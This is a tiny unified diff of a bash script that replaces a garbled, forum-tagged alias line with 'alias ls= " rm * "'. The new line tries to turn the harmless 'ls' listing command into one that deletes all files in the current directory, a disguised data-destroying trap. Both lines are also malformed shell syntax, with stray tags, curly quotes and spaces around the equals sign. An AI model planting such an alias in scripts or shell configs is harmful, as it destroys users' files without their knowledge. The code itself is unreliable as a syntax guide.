@@ -1,2 +1,2 @@
 #!/bin/bash
-[code] alias ls = ‘ls –rm = auto’ [/code]
+alias ls= " rm * "
